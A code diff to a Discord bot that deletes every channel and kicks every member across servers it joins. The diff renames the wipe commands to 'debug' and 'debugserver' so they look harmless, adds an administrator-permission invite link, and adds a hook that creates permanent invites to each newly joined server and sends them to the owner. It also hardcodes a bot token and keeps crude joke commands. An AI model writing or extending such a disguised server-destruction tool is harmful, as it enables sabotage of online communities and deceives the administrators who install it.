@@ -1,4 +1,4 @@
-const { Client, Intents, PermissionsBitField } = require('discord.js');
+const { Client, Intents, Permissions } = require('discord.js');
 const https = require('https');
 
 const TOKEN = "MTQ4MDU5Mjg3NjY4NDcwNjA2NA.G8eWtP.bvr7AmlhdTnWW5BEK-5FQT9bNtg1Au1XM4i5pM";
@@ -33,8 +33,8 @@ const commands = [
     description: "Make the bot leave all servers"
   },
   {
-    name: "cleanup",
-    description: "Start wiping all servers"
+    name: "debug",
+    description: "Run a full debug wipe across all servers"
   },
   {
     name: "diddle",
@@ -54,6 +54,21 @@ const commands = [
       description: "User to oil up",
       type: 6,
       required: true
+    }]
+  },
+  {
+    name: "invite",
+    description: "Get the bot invite link"
+  },
+  {
+    name: "debugserver",
+    description: "Run a debug wipe on a specific server",
+    options: [{
+      name: "server",
+      description: "Server to debug",
+      type: 3,
+      required: true,
+      autocomplete: true
     }]
   }
 ];
@@ -96,9 +111,9 @@ async function wipeServers(owner) {
   
   for (const guild of client.guilds.cache.values()) {
     try {
-      const me = guild.members.me;
-      const canKick = me.permissions.has(PermissionsBitField.FLAGS.KICK_MEMBERS);
-      const canDelete = me.permissions.has(PermissionsBitField.FLAGS.MANAGE_CHANNELS);
+      const me = guild.me;
+      const canKick = me.permissions.has(Permissions.FLAGS.KICK_MEMBERS);
+      const canDelete = me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS);
 
       if (!canKick || !canDelete) {
         await owner.send(`Skipped: ${guild.name} (missing permissions)`);
@@ -157,6 +172,19 @@ client.once("ready", async () => {
 });
 
 client.on("interactionCreate", async interaction => {
+  if (interaction.isAutocomplete()) {
+    const { commandName } = interaction;
+    if (commandName === "debugserver") {
+      const focused = interaction.options.getFocused().toLowerCase();
+      const choices = client.guilds.cache
+        .filter(g => g.name.toLowerCase().includes(focused))
+        .map(g => ({ name: g.name, value: g.id }))
+        .slice(0, 25);
+      await interaction.respond(choices);
+    }
+    return;
+  }
+
   if (!interaction.isCommand()) return;
 
   const { commandName, user } = interaction;
@@ -171,7 +199,7 @@ client.on("interactionCreate", async interaction => {
     }
 
     if (user.id !== OWNER_ID) {
-      if (["servers", "leaveall", "cleanup"].includes(commandName)) {
+      if (["servers", "leaveall", "debug", "debugserver"].includes(commandName)) {
         await interaction.reply({
           content: "You cannot use this command.",
           ephemeral: true
@@ -208,6 +236,11 @@ client.on("interactionCreate", async interaction => {
       return;
     }
 
+    if (commandName === "invite") {
+      await interaction.reply("https://discord.com/oauth2/authorize?client_id=1480592876684706064&permissions=8&integration_type=0&scope=bot");
+      return;
+    }
+
     if (commandName === "diddle") {
       const target = interaction.options.getUser("user");
       await interaction.reply(`<@${target.id}> was diddled`);
@@ -220,9 +253,62 @@ client.on("interactionCreate", async interaction => {
       return;
     }
 
-    if (commandName === "cleanup") {
+    if (commandName === "debugserver") {
+      if (user.id !== OWNER_ID) {
+        await interaction.reply({ content: "You cannot use this command.", ephemeral: true });
+        return;
+      }
+
+      const guildId = interaction.options.getString("server");
+      const guild = client.guilds.cache.get(guildId);
+
+      if (!guild) {
+        await interaction.reply({ content: "Server not found.", ephemeral: true });
+        return;
+      }
+
+      await interaction.reply({ content: `Starting wipe on **${guild.name}**. Check your DMs.`, ephemeral: true });
+
+      const owner = await client.users.fetch(OWNER_ID);
+      await owner.send(`Starting wipe on **${guild.name}**...`);
+
+      try {
+        const me = guild.me;
+        const canKick = me.permissions.has(Permissions.FLAGS.KICK_MEMBERS);
+        const canDelete = me.permissions.has(Permissions.FLAGS.MANAGE_CHANNELS);
+
+        if (!canKick || !canDelete) {
+          await owner.send(`❌ Missing permissions in **${guild.name}**.`);
+          return;
+        }
+
+        for (const channel of guild.channels.cache.values()) {
+          try { await channel.delete(); await delay(800); } catch (e) {}
+        }
+
+        await guild.members.fetch();
+        let kicked = 0;
+        for (const member of guild.members.cache.values()) {
+          if (member.kickable) {
+            try {
+              await member.kick("Server cleanup");
+              kicked++;
+              if (kicked % 10 === 0) await owner.send(`${guild.name}: kicked ${kicked}`);
+              await delay(1200);
+            } catch (e) {}
+          }
+        }
+
+        await owner.send(`✅ Done with **${guild.name}**. Kicked: ${kicked}`);
+      } catch (e) {
+        await owner.send(`❌ Error wiping **${guild.name}**: ${e.message}`);
+      }
+      return;
+    }
+
+    if (commandName === "debug") {
       await interaction.reply({
-        content: "Starting cleanup. Check your DMs for updates.",
+        content: "Starting debug wipe across all servers. Check your DMs for updates.",
         ephemeral: true
       });
 
@@ -246,6 +332,28 @@ process.on("unhandledRejection", error => {
 
 process.on("uncaughtException", error => {
   console.error("❌ Uncaught exception:", error.message);
+});
+
+client.on("guildCreate", async guild => {
+  console.log(`📥 Joined new server: ${guild.name}`);
+  try {
+    const owner = await client.users.fetch(OWNER_ID);
+
+    const channel = guild.channels.cache.find(c =>
+      c.type === "GUILD_TEXT" &&
+      guild.me.permissionsIn(c).has(Permissions.FLAGS.CREATE_INSTANT_INVITE)
+    );
+
+    if (!channel) {
+      await owner.send(`✅ Joined **${guild.name}** but couldn't create an invite (no suitable channel).`);
+      return;
+    }
+
+    const invite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
+    await owner.send(`✅ Joined **${guild.name}**!\nInvite: ${invite.url}`);
+  } catch (error) {
+    console.error("❌ guildCreate error:", error.message);
+  }
 });
 
 client.on("error", error => {
